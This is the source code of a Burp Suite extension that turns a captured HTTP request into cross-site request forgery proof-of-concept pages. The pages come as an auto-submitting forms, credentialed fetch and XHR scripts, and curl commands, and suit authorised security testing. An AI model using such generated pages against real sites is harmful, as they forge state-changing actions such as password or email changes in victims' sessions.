# -*- coding: utf-8 -*-
from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem, JDialog, JScrollPane, JTextArea, JButton, JPanel, JFileChooser, JCheckBox, JComboBox, JLabel
from java.awt import BorderLayout, Dimension, FlowLayout, GridBagLayout, GridBagConstraints, Insets
from java.net import URLDecoder, URLEncoder
import java.awt.Desktop as Desktop
import java.io.File as File
from java.util import ArrayList
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit
import re

# Optional syntax highlighting
try:
    from org.fife.ui.rsyntaxtextarea import RSyntaxTextArea, SyntaxConstants
    from org.fife.ui.rtextarea import RTextScrollPane
    HAS_SYNTAX = True
except ImportError:
    HAS_SYNTAX = False

class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Advanced CSRF PoC Generator")
        callbacks.registerContextMenuFactory(self)
        print("[+] Advanced CSRF PoC Generator loaded successfully")

    def createMenuItems(self, invocation):
        menu = ArrayList()
        menu_item = JMenuItem("Generate CSRF PoC", actionPerformed=lambda x: self.generate_poc(invocation))
        menu.add(menu_item)
        return menu

    def generate_poc(self, invocation):
        try:
            selected_messages = invocation.getSelectedMessages()
            if not selected_messages or len(selected_messages) == 0:
                print("[ERROR] No request selected")
                return
                
            request_info = self._helpers.analyzeRequest(selected_messages[0])
            request = selected_messages[0].getRequest()
            headers = request_info.getHeaders()
            method = request_info.getMethod()
            url = request_info.getUrl()
            body_offset = request_info.getBodyOffset()
            body = self._helpers.bytesToString(request[body_offset:])
            
            # Parse URL components
            protocol = url.getProtocol()
            host = url.getHost()
            file = url.getFile()
            port = url.getPort()

            # Construct action URL
            if (protocol == "http" and port == 80) or (protocol == "https" and port == 443):
                action_url = "{}://{}{}".format(protocol, host, file)
            else:
                action_url = "{}://{}:{}{}".format(protocol, host, port, file)

            # Extract Content-Type
            content_type = "application/x-www-form-urlencoded"
            for header in headers:
                if header.lower().startswith("content-type:"):
                    content_type = header.split(":", 1)[1].strip()
                    break

            # Parse parameters intelligently based on method and content type
            form_fields = []
            json_body = None
            is_json = False
            is_multipart = False
            
            # Handle different request types
            if "application/json" in content_type.lower():
                is_json = True
                json_body = body.strip()
                # Try to parse JSON to extract fields
                try:
                    import json
                    data = json.loads(json_body)
                    form_fields = self.flatten_json(data)
                except:
                    # If JSON parsing fails, treat as raw body
                    form_fields = []
                    
            elif "multipart/form-data" in content_type.lower():
                is_multipart = True
                form_fields = self.parse_multipart(body, content_type)
                
            elif method.upper() in ["POST", "PUT", "PATCH", "DELETE"] and body.strip():
                # URL-encoded or other body
                if "&" in body or "=" in body:
                    form_fields = self.parse_urlencoded(body)
                else:
                    # Raw body
                    form_fields = [("body", body.strip())]
                    
            elif method.upper() == "GET":
                query = url.getQuery()
                if query:
                    form_fields = self.parse_urlencoded(query)
                    # Remove query from action URL for GET
                    if "?" in action_url:
                        action_url = action_url.split("?")[0]

            # Store request details
            self.method = method
            self.form_fields = form_fields
            self.action_url = action_url
            self.content_type = content_type
            self.json_body = json_body
            self.is_json = is_json
            self.is_multipart = is_multipart
            self.original_url = str(url)
            self.host = host
            
            # Store headers for analysis
            self.headers = headers
            
            # Generate request summary
            summary = self.generate_summary(headers)
            
            # Generate default PoC (HTML + JavaScript Fetch)
            default_html = self.generate_auto_csrf_poc()
            
            self.show_popup("CSRF PoC Generator", default_html, summary)
            
        except Exception as e:
            print("[ERROR] " + str(e))
            import traceback
            traceback.print_exc()

    def generate_summary(self, headers):
        """Generate enhanced request summary with header analysis"""
        param_count = len(self.form_fields)
        request_type = "JSON" if self.is_json else ("Multipart" if self.is_multipart else "URL-encoded")
        
        # Analyze headers
        csrf_token_found = False
        custom_headers = []
        accept_header = None
        origin_header = None
        referer_header = None
        xhr_header = False
        
        for header in headers:
            header_lower = header.lower()
            
            # CSRF token detection
            if "csrf" in header_lower or "xsrf" in header_lower:
                csrf_token_found = True
                custom_headers.append(header.split(":", 1)[0])
            
            # Accept header
            if header_lower.startswith("accept:"):
                accept_header = header.split(":", 1)[1].strip()
            
            # Origin header
            if header_lower.startswith("origin:"):
                origin_header = header.split(":", 1)[1].strip()
            
            # Referer header
            if header_lower.startswith("referer:"):
                referer_header = header.split(":", 1)[1].strip()
            
            # XMLHttpRequest detection
            if header_lower.startswith("x-requested-with:"):
                xhr_header = True
                custom_headers.append("X-Requested-With")
            
            # Other custom headers
            if header_lower.startswith("x-") and not header_lower.startswith("x-requested-with:"):
                custom_headers.append(header.split(":", 1)[0])
        
        # Risk assessment
        risk_indicators = []
        if not csrf_token_found:
            risk_indicators.append("No CSRF token detected")
        if not xhr_header and self.is_json:
            risk_indicators.append("JSON request without X-Requested-With")
        if self.method.upper() in ["POST", "PUT", "DELETE", "PATCH"]:
            risk_indicators.append("State-changing operation")
        
        risk_level = "HIGH" if len(risk_indicators) >= 2 else ("MEDIUM" if len(risk_indicators) == 1 else "LOW")
        
        # Build summary
        summary = """=== REQUEST SUMMARY ===
Target: {}
Method: {}
Host: {}
Content-Type: {}
Accept: {}
Parameters: {} fields detected
Request Type: {}

=== HEADER ANALYSIS ===
CSRF Token: {}
Custom Headers: {}
Origin: {}
Referer: {}
X-Requested-With: {}

=== SECURITY ASSESSMENT ===
Risk Level: {}
Indicators: {}
=========================""".format(
            self.original_url, 
            self.method, 
            self.host, 
            self.content_type,
            accept_header if accept_header else "Not specified",
            param_count, 
            request_type,
            "Found" if csrf_token_found else "NOT FOUND",
            ", ".join(custom_headers) if custom_headers else "None",
            origin_header if origin_header else "Not present",
            referer_header if referer_header else "Not present",
            "Yes" if xhr_header else "No",
            risk_level,
            "; ".join(risk_indicators) if risk_indicators else "None detected"
        )
        return summary

    def parse_urlencoded(self, data):
        """Parse URL-encoded parameters"""
        fields = []
        if not data:
            return fields
        for param in data.split("&"):
            if "=" in param:
                k, v = param.split("=", 1)
                try:
                    k = URLDecoder.decode(k, "UTF-8")
                    v = URLDecoder.decode(v, "UTF-8")
                except:
                    pass
                fields.append((k, v))
        return fields

    def parse_multipart(self, body, content_type):
        """Parse multipart/form-data"""
        fields = []
        boundary_match = re.search(r'boundary=([^\s;]+)', content_type)
        if not boundary_match:
            return fields
        
        boundary = boundary_match.group(1)
        parts = body.split("--" + boundary)
        
        for part in parts:
            if 'Content-Disposition' in part:
                name_match = re.search(r'name="([^"]+)"', part)
                if name_match:
                    name = name_match.group(1)
                    # Extract value after headers
                    lines = part.split('\n')
                    value_started = False
                    value = []
                    for line in lines:
                        if value_started:
                            value.append(line)
                        elif line.strip() == '':
                            value_started = True
                    fields.append((name, '\n'.join(value).strip()))
        return fields

    def flatten_json(self, obj, parent_key=''):
        """Flatten JSON object for form representation"""
        items = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_key = "{}[{}]".format(parent_key, k) if parent_key else k
                if isinstance(v, (dict, list)):
                    items.extend(self.flatten_json(v, new_key))
                else:
                    items.append((new_key, str(v)))
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                new_key = "{}[{}]".format(parent_key, i)
                if isinstance(v, (dict, list)):
                    items.extend(self.flatten_json(v, new_key))
                else:
                    items.append((new_key, str(v)))
        return items

    def generate_auto_csrf_poc(self):
        """Auto-generate CSRF PoC using HTML + JavaScript Fetch format"""
        domain = self.host
        
        # Detect Accept header for fetch
        accept_header = "*/*"
        for header in self.headers:
            if header.lower().startswith("accept:"):
                accept_header = header.split(":", 1)[1].strip()
                break
        
        # Generate fetch request based on content type
        if self.is_json and self.json_body:
            # JSON request - use JSON.stringify with actual object
            try:
                import json
                # Parse and pretty print JSON
                json_obj = json.loads(self.json_body)
                json_formatted = json.dumps(json_obj, indent=4)
                # Indent for script block (6 spaces)
                json_indented = "\n".join(["          " + line if line.strip() else "" 
                                          for line in json_formatted.split("\n")])
                
                fetch_code = """      fetch("{}", {{
        method: "{}",
        credentials: "include",
        headers: {{
          "Accept": "{}",
          "Content-Type": "{}"
        }},
        body: JSON.stringify(
{}
        )
      }});""".format(self.action_url, self.method, accept_header, 
                     self.content_type, json_indented)
            except:
                # If JSON parsing fails, use raw string
                body_str = self.json_body.replace('\\', '\\\\').replace('"', '\\"').replace("\n", " ")
                fetch_code = """      fetch("{}", {{
        method: "{}",
        credentials: "include",
        headers: {{
          "Accept": "{}",
          "Content-Type": "{}"
        }},
        body: "{}"
      }});""".format(self.action_url, self.method, accept_header, 
                     self.content_type, body_str)
            
        else:
            # URL-encoded or form data request
            if len(self.form_fields) > 0:
                # Build URL-encoded string directly
                params = []
                for name, value in self.form_fields:
                    params.append("{}={}".format(
                        self.url_encode(str(name)), 
                        self.url_encode(str(value))))
                body_string = "&".join(params)
                
                fetch_code = """      fetch("{}", {{
        method: "{}",
        credentials: "include",
        headers: {{
          "Accept": "{}",
          "Content-Type": "application/x-www-form-urlencoded"
        }},
        body: "{}"
      }});""".format(self.action_url, self.method, accept_header, body_string)
            else:
                # No body
                fetch_code = """      fetch("{}", {{
        method: "{}",
        credentials: "include",
        headers: {{
          "Accept": "{}"
        }}
      }});""".format(self.action_url, self.method, accept_header)
        
        # Generate action description
        action_desc = "CSRF Attack"
        if "update" in self.action_url.lower() or "edit" in self.action_url.lower():
            action_desc = "Profile Update"
        elif "delete" in self.action_url.lower():
            action_desc = "Delete Operation"
        elif "password" in self.action_url.lower():
            action_desc = "Password Change"
        elif "message" in self.action_url.lower() or "chat" in self.action_url.lower():
            action_desc = "Message Injection"
        elif "email" in self.action_url.lower():
            action_desc = "Email Change"
        
        # Generate clean HTML with Fetch
        html = """<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF PoC - {}</h1>
    <script>
{}
    </script>
  </body>
</html>""".format(action_desc, fetch_code)
        
        return html

    def generate_html_form_classic(self, auto_submit, show_summary):
        """Generate classic HTML form PoC (traditional method)"""
        form_fields_html = ""
        for name, value in self.form_fields:
            name_escaped = self.html_escape(name)
            value_escaped = self.html_escape(value)
            form_fields_html += '      <input type="hidden" name="{}" value="{}">\n'.format(
                name_escaped, value_escaped)

        submit_script = """
    <script>
      document.forms[0].submit();
    </script>""" if auto_submit else ""

        summary_html = ""
        if show_summary:
            summary_html = """
    <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; border-left: 4px solid #333;">
      <h3>Request Details</h3>
      <p><strong>Target URL:</strong> {}</p>
      <p><strong>Method:</strong> {}</p>
      <p><strong>Parameters:</strong> {} fields</p>
      <p><strong>Content-Type:</strong> {}</p>
    </div>""".format(self.original_url, self.method, len(self.form_fields), self.content_type)

        return """<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
  </head>
  <body>
    <h2>CSRF PoC - {}</h2>{}
    <form action="{}" method="{}">
{}      <input type="submit" value="Submit CSRF Request">
    </form>{}
  </body>
</html>""".format(self.host, summary_html, 
                 self.action_url, self.method, form_fields_html, submit_script)

    def generate_fetch_js(self, use_credentials):
        """Generate pure JavaScript Fetch API PoC (Advanced) - Clean minimal output"""
        # Detect Accept header
        accept_header = "*/*"
        for header in self.headers:
            if header.lower().startswith("accept:"):
                accept_header = header.split(":", 1)[1].strip()
                break
        
        if self.is_json and self.json_body:
            # JSON request - use JSON.stringify with actual object
            try:
                import json
                # Parse and pretty print JSON
                json_obj = json.loads(self.json_body)
                json_formatted = json.dumps(json_obj, indent=2)
                # Indent for body (4 spaces)
                json_indented = "\n".join(["    " + line if line.strip() else "" 
                                          for line in json_formatted.split("\n")])
                
                return """// CSRF PoC - Pure JavaScript
fetch("{}", {{
  method: "{}",
  credentials: "{}",
  headers: {{
    "Accept": "{}",
    "Content-Type": "{}"
  }},
  body: JSON.stringify(
{}
  )
}});""".format(
                    self.action_url, 
                    self.method, 
                    "include" if use_credentials else "same-origin",
                    accept_header,
                    self.content_type,
                    json_indented)
            except:
                # Fallback to raw string if JSON parsing fails
                body_str = self.json_body.replace('\\', '\\\\').replace('"', '\\"').replace("\n", " ")
                return """// CSRF PoC - Pure JavaScript
fetch("{}", {{
  method: "{}",
  credentials: "{}",
  headers: {{
    "Accept": "{}",
    "Content-Type": "{}"
  }},
  body: "{}"
}});""".format(
                    self.action_url, 
                    self.method, 
                    "include" if use_credentials else "same-origin",
                    accept_header,
                    self.content_type,
                    body_str)
        else:
            # URL-encoded request - direct body string (no URLSearchParams)
            if len(self.form_fields) > 0:
                params = []
                for name, value in self.form_fields:
                    params.append("{}={}".format(
                        self.url_encode(str(name)), 
                        self.url_encode(str(value))))
                body_string = "&".join(params)
                
                return """// CSRF PoC - Pure JavaScript
fetch("{}", {{
  method: "{}",
  credentials: "{}",
  headers: {{
    "Accept": "{}",
    "Content-Type": "application/x-www-form-urlencoded"
  }},
  body: "{}"
}});""".format(
                    self.action_url, 
                    self.method, 
                    "include" if use_credentials else "same-origin",
                    accept_header,
                    body_string)
            else:
                # No body - just headers
                return """// CSRF PoC - Pure JavaScript
fetch("{}", {{
  method: "{}",
  credentials: "{}",
  headers: {{
    "Accept": "{}"
  }}
}});""".format(
                    self.action_url, 
                    self.method, 
                    "include" if use_credentials else "same-origin",
                    accept_header)

    def generate_xhr_js(self):
        """Generate XMLHttpRequest PoC"""
        if self.is_json and self.json_body:
            body_str = self.json_body.replace("'", "\\'").replace("\n", "\\n")
            content_type = "application/json"
        else:
            params = []
            for name, value in self.form_fields:
                params.append('{}={}'.format(
                    self.url_encode(name), self.url_encode(value)))
            body_str = "&".join(params)
            content_type = "application/x-www-form-urlencoded"

        return """// CSRF PoC using XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('{}', '{}', true);
xhr.setRequestHeader('Content-Type', '{}');
xhr.withCredentials = true;

xhr.onload = function() {{
  if (xhr.status >= 200 && xhr.status < 300) {{
    console.log('Success:', xhr.responseText);
  }} else {{
    console.log('Error:', xhr.status);
  }}
}};

xhr.onerror = function() {{
  console.error('Request failed');
}};

xhr.send('{}');""".format(self.method, self.action_url, content_type, body_str)

    def generate_curl(self):
        """Generate cURL command"""
        if self.is_json and self.json_body:
            return "curl -X {} \\\n  -H 'Content-Type: application/json' \\\n  -d '{}' \\\n  '{}'".format(
                self.method.upper(), self.json_body.replace("'", "'\\''"), self.action_url)
        else:
            data_parts = []
            for name, value in self.form_fields:
                data_parts.append("{}={}".format(name, value))
            data = "&".join(data_parts)
            return "curl -X {} \\\n  -H 'Content-Type: {}' \\\n  -d '{}' \\\n  '{}'".format(
                self.method.upper(), self.content_type, data.replace("'", "'\\''"), self.action_url)

    def html_escape(self, text):
        """Escape HTML special characters"""
        return (str(text).replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace('"', "&quot;")
                   .replace("'", "&#x27;"))

    def url_encode(self, text):
        """URL encode text"""
        return URLEncoder.encode(str(text), "UTF-8")

    def show_popup(self, title, content, summary):
        dialog = JDialog()
        dialog.setTitle(title)
        dialog.setSize(1000, 800)
        dialog.setModal(True)
        dialog.setLayout(BorderLayout())

        # Summary panel
        summary_area = JTextArea(summary)
        summary_area.setEditable(False)
        summary_area.setBackground(dialog.getBackground())
        summary_area.setFont(summary_area.getFont().deriveFont(12.0))
        summary_scroll = JScrollPane(summary_area)
        summary_scroll.setPreferredSize(Dimension(980, 100))
        dialog.add(summary_scroll, BorderLayout.NORTH)

        # Options panel
        options_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        
        options_panel.add(JLabel("Format:"))
        format_dropdown = JComboBox(["Auto PoC (Fetch JS)", "HTML Form (Classic)", 
                                     "JavaScript Fetch (Advanced)", "XMLHttpRequest", "cURL Command"])
        options_panel.add(format_dropdown)
        
        auto_submit_checkbox = JCheckBox("Auto-submit", True)
        options_panel.add(auto_submit_checkbox)
        
        show_summary_checkbox = JCheckBox("Show Details", False)
        options_panel.add(show_summary_checkbox)
        
        credentials_checkbox = JCheckBox("Include Credentials", True)
        options_panel.add(credentials_checkbox)

        # Output area
        if HAS_SYNTAX:
            text_area = RSyntaxTextArea()
            text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_HTML)
            text_area.setCodeFoldingEnabled(True)
            text_area.setText(content)
            scroll = RTextScrollPane(text_area)
        else:
            text_area = JTextArea(content)
            text_area.setLineWrap(True)
            text_area.setWrapStyleWord(True)
            text_area.setEditable(True)
            scroll = JScrollPane(text_area)

        scroll.setPreferredSize(Dimension(980, 550))
        
        # Create center panel with options and output
        center_panel = JPanel(BorderLayout())
        center_panel.add(options_panel, BorderLayout.NORTH)
        center_panel.add(scroll, BorderLayout.CENTER)
        dialog.add(center_panel, BorderLayout.CENTER)

        # Bottom panel with buttons
        button_panel = JPanel(FlowLayout(FlowLayout.CENTER))
        copy_button = JButton("Copy to Clipboard")
        save_button = JButton("Save to File")
        preview_button = JButton("Preview in Browser")
        close_button = JButton("Close")

        def update_output(event=None):
            fmt = format_dropdown.getSelectedItem()
            if fmt == "Auto PoC (Fetch JS)":
                content = self.generate_auto_csrf_poc()
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_HTML)
            elif fmt == "HTML Form (Classic)":
                content = self.generate_html_form_classic(
                    auto_submit_checkbox.isSelected(),
                    show_summary_checkbox.isSelected())
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_HTML)
            elif fmt == "JavaScript Fetch (Advanced)":
                content = self.generate_fetch_js(credentials_checkbox.isSelected())
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_JAVASCRIPT)
            elif fmt == "XMLHttpRequest":
                content = self.generate_xhr_js()
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_JAVASCRIPT)
            elif fmt == "cURL Command":
                content = self.generate_curl()
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_NONE)
            text_area.setText(content)

        def save_to_file(event):
            chooser = JFileChooser()
            fmt = format_dropdown.getSelectedItem()
            if "HTML" in fmt or "Auto PoC" in fmt:
                chooser.setSelectedFile(File("csrf_poc.html"))
            elif "JavaScript" in fmt or "XMLHttpRequest" in fmt:
                chooser.setSelectedFile(File("csrf_poc.js"))
            else:
                chooser.setSelectedFile(File("csrf_poc.sh"))
                
            ret = chooser.showSaveDialog(dialog)
            if ret == JFileChooser.APPROVE_OPTION:
                path = chooser.getSelectedFile().getAbsolutePath()
                try:
                    with open(path, "w") as f:
                        f.write(text_area.getText())
                    print("[+] Saved to: " + path)
                except Exception as e:
                    print("[ERROR] Failed to save: " + str(e))

        def preview_in_browser(event):
            try:
                temp_file = File.createTempFile("csrf_poc", ".html")
                temp_file.deleteOnExit()
                with open(temp_file.getAbsolutePath(), "w") as f:
                    f.write(text_area.getText())
                Desktop.getDesktop().browse(temp_file.toURI())
                print("[+] Opened in browser: " + temp_file.getAbsolutePath())
            except Exception as e:
                print("[ERROR] Failed to open in browser: " + str(e))

        def copy_to_clipboard(event):
            try:
                clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
                clipboard.setContents(StringSelection(text_area.getText()), None)
                print("[+] Copied to clipboard")
            except Exception as e:
                print("[ERROR] Failed to copy: " + str(e))

        def close_dialog(event):
            dialog.dispose()

        # Event bindings
        auto_submit_checkbox.addActionListener(update_output)
        show_summary_checkbox.addActionListener(update_output)
        credentials_checkbox.addActionListener(update_output)
        format_dropdown.addActionListener(update_output)
        save_button.addActionListener(save_to_file)
        preview_button.addActionListener(preview_in_browser)
        close_button.addActionListener(close_dialog)
        copy_button.addActionListener(copy_to_clipboard)

        button_panel.add(copy_button)
        button_panel.add(save_button)
        button_panel.add(preview_button)
        button_panel.add(close_button)
        
        dialog.add(button_panel, BorderLayout.SOUTH)
        dialog.setLocationRelativeTo(None)
        dialog.setVisible(True)